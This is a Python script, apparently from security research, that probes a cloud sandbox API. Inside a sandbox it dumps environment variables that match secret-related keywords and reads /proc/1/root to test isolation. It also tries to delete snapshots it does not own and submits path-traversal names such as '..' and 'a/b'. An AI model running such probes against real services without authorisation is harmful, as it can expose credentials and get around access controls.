# 实验J107: cmd 进程 environ 凭证检查 + 创建沙箱参数面 (runtime/vcpus/memory) + snapshot DELETE 越权 + name 注入
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:800]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

# --- [A] /v1/sandboxes 完整响应 ---
print("== [A] GET /v1/sandboxes 完整 ==", flush=True)
c, r = api("GET", f"/v1/sandboxes?teamId={TEAM}&project={PROJ}")
print(f"  {c}: {r[:900]}", flush=True)

# --- [B] 创建参数面 ---
print("\n== [B] 创建沙箱参数变体 ==", flush=True)
variants = [
    ("runtime-extra", {"projectId": PROJ, "name": "expj107a", "runtime": "python3"}),
    ("runtime-fake", {"projectId": PROJ, "name": "expj107b", "runtime": "fake-runtime-xyz"}),
    ("vcpus", {"projectId": PROJ, "name": "expj107c", "vcpus": 1}),
    ("memory", {"projectId": PROJ, "name": "expj107d", "memory": 2048}),
    ("persistent", {"projectId": PROJ, "name": "expj107e", "persistent": False}),
    ("timeout", {"projectId": PROJ, "name": "expj107f", "timeout": 60000}),
]
for label, body in variants:
    c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}", body)
    print(f"  [{label}] {c}: {r[:220]}", flush=True)
    if c == 200:
        nm = body["name"]
        api("DELETE", f"/v2/sandboxes/{nm}?teamId={TEAM}&projectId={PROJ}")
    time.sleep(0.5)

# --- [C] 沙箱内 cmd environ ---
NAME = "expj107"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print(f"\n== [C] create -> {c}", flush=True)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

PROBE = r"""
import os, subprocess

print("== [C1] 当前 cmd 进程 environ (过滤敏感词) ==", flush=True)
env = dict(os.environ)
keys = sorted(env.keys())
print(f"  {len(keys)} vars", flush=True)
for k in keys:
    v = env[k]
    if any(w in k.upper() for w in ["TOKEN", "KEY", "SECRET", "PASS", "AUTH", "CRED", "API"]):
        print(f"  SENS: {k}={v[:120]}", flush=True)
print("  ALL:", " | ".join(f"{k}={v[:40]}" for k, v in sorted(env.items())), flush=True)

print("== [C2] 进程树 (cmd 的父进程) ==", flush=True)
r = subprocess.run(["ps", "auxf"], capture_output=True, timeout=5)
print(r.stdout.decode(errors="replace")[:800], flush=True)

print("== [C3] 写一个标记文件到 /tmp, 检查 PID1 视图可见性 ==", flush=True)
open("/tmp/j107_marker", "w").write("hello-from-cmd")
print("  written", flush=True)
r = subprocess.run(["cat", "/proc/1/root/tmp/j107_marker"], capture_output=True, timeout=5)
print("  pid1 view:", r.stdout.decode(errors="replace"), r.stderr.decode(errors="replace")[:100], flush=True)
"""
run_cmd(sid, PROBE, "environ-check", wait=True, timeout=300000)

# --- [D] snapshot DELETE 越权 ---
print("\n== [D] DELETE snapshot 越权 ==", flush=True)
for fake in ["snap_zzzzzzzzzzzzzzzzzzzzzzzzzzzz",
             "snap_9DuDa2AVJPoUO4jSAMRjKJMgvBxR"]:
    c, r = api("DELETE", f"/v2/sandboxes/snapshots/{fake}?teamId={TEAM}&project={PROJ}")
    print(f"  DELETE {fake[:16]}... -> {c}: {r[:200]}", flush=True)
    time.sleep(0.4)

# --- [E] name 特殊字符 ---
print("\n== [E] name 特殊字符 ==", flush=True)
for nm in ["a b", "a/b", "..", "a%2Fb", "A" * 60]:
    c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
               {"projectId": PROJ, "name": nm})
    print(f"  create name={nm[:20]!r} -> {c}: {r[:200]}", flush=True)
    if c == 200:
        api("DELETE", f"/v2/sandboxes/{nm}?teamId={TEAM}&projectId={PROJ}")
    time.sleep(0.4)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
